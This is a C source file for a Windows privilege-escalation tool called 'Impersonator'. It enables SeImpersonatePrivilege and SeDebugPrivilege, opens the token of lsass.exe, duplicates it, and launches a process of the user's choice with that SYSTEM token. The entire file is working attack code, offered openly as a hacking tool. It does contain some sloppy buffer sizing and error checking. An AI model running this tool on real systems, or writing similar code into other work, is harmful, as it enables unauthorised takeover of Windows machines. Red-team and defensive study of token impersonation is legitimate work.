#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "advapi32")

int FindTarget(const char *procname);
BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege);

int main(int argc, char** argv)
{
	if(argc < 2)
	{
		printf("[-] Not enough args!\n");
		printf("[-] Usage: %s [process.exe]\n", argv[0]);
		printf("[-] Example: %s cmd.exe\n", argv[0]);
		return 1;
	}
	
	wchar_t wtext[sizeof(argv[1]) + 2];
	mbstowcs(wtext, argv[1], strlen(argv[1])+1);
	LPCWSTR process = wtext;
	
	printf("Impersonator by Plackyhacker\n");
	printf("----------------------------\n");
	
	HANDLE currentTokenHandle = NULL;
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	
	if (SetPrivilege(currentTokenHandle, "SeImpersonatePrivilege", TRUE))
	{
		printf("[+] SeImpersonatePrivilege enabled!\n");
	}
	else
	{
		printf("[-] SeImpersonatePrivilege not enabled!\n");
		printf("[-] Exiting!\n");
		return 1;
	}

	if (SetPrivilege(currentTokenHandle, "SeDebugPrivilege", TRUE))
	{
		printf("[+] SeDebugPrivilege enabled!\n");
	}
	else
	{
		printf("[-] SeDebugPrivilege not enabled!\n");
		printf("[-] Exiting!\n");
		return 1;
	}
	
	char* processName = "lsass.exe";
	int PID = FindTarget(processName);
	
	// We open the process to retrieve information about the process (specifically the token).
	//
	HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, PID);
	
	if (GetLastError() == NULL)
	{
		printf("[+] OpenProcess() success!\n");
		printf("[+] Process name: %s\n", processName);
		printf("[+] Process HANDLE: %i\n", processHandle);
		printf("[+] Process ID: %d\n", PID);
	}
	else
	{
		printf("[-] OpenProcess() Return Code: %i\n", processHandle);
		printf("[-] OpenProcess() Error: %i\n", GetLastError());
	}
	
	// Next we open the primary token associated with the process (processHandle) and assign it to a pointer (currentTokenHandle)
	//
	//HANDLE primaryTokenHandle = NULL;
	BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &currentTokenHandle);
	
	if (GetLastError() == NULL)
	{
		printf("[+] OpenProcessToken() success!\n");
		printf("[+] Process token HANDLE: %i\n", currentTokenHandle);
	}
	else
	{
		printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
		printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
	}
	
	// Call DuplicateTokenEx(), print return code and error code
	//
	HANDLE duplicateTokenHandle = NULL;
	
	BOOL duplicateToken = DuplicateTokenEx(currentTokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
	if (GetLastError() == NULL)
	{
		printf("[+] DuplicateTokenEx() success!\n");
		printf("[+] Duplicated token HANDLE: %i\n", currentTokenHandle);
	}
	else
	{
		printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
		printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
	}
	
	// Call CreateProcessWithTokenW(), print return code and error code
	//
	STARTUPINFO startupInfo;
    PROCESS_INFORMATION processInformation;
	
	ZeroMemory(&startupInfo, sizeof(startupInfo));
	startupInfo.cb = sizeof(startupInfo);
	ZeroMemory(&processInformation, sizeof(processInformation));
	
	printf("[+] Spawning new process: %ls\n", process);
	BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, 0, process, NULL, 0, NULL, NULL, &startupInfo, &processInformation);

	if (GetLastError() == NULL)
	{
		printf("[+] Process spawned!\n");
	}
	else
	{
		printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
		printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
	}
	
	return 0;
}

BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	if (!LookupPrivilegeValue( NULL, lpszPrivilege,	&luid))
	{
		printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}
	
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;

	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.
	//
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		printf("[-] The token does not have the specified privilege. \n");
		return FALSE;
	}
	
	return TRUE;
}

// Helper function to find a PID based on the process name
//
int FindTarget(const char *procname) {

	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;
			
	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
			
	pe32.dwSize = sizeof(PROCESSENTRY32); 
			
	if (!Process32First(hProcSnap, &pe32)) {
			CloseHandle(hProcSnap);
			return 0;
	}
			
	while (Process32Next(hProcSnap, &pe32)) {
			if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
					pid = pe32.th32ProcessID;
					break;
			}
	}
			
	CloseHandle(hProcSnap);
			
	return pid;
}
